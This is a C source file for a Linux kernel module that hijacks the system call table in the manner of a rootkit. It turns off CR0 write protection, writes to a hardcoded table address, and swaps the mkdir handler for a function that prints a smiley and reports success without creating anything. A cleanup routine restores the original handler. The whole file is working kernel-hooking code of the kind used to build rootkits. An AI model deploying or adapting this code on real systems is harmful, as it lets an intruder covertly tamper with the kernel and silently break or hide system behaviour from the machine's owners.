#include <asm/unistd.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>

#include "include/sys_calls.h"

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
typedef asmlinkage long (*mkdir_t)(const char *, mode_t);

static mkdir_t original_mkdir;

static unsigned long *syscall_table = NULL;

static asmlinkage long hacked_mkdir(const char *path, mode_t mode) {
	printk(KERN_INFO ":-)\n");

	return 0;
}

static inline void _write_cr0(unsigned long val) {
	__asm__ __volatile__("mov %0, %%cr0": "+r"(val));
}

static void disable_write_protection(void) {
	unsigned long val = read_cr0();
	val &= (~0x10000);
	_write_cr0(val);
}

static void enable_write_protection(void) {
	unsigned long val = read_cr0();
	val |= 0x10000;
	_write_cr0(val);
}

int sys_calls_init(void) {
	disable_write_protection();

	syscall_table = (unsigned long *)0xffffffff8bc00300;
	original_mkdir = (mkdir_t)syscall_table[__NR_mkdir];
	syscall_table[__NR_mkdir] = (sys_call_ptr_t)hacked_mkdir;

	enable_write_protection();

	return 0;
}

void sys_calls_cleanup(void) {
	disable_write_protection();

	syscall_table[__NR_mkdir] = (sys_call_ptr_t)original_mkdir;

	enable_write_protection();
}

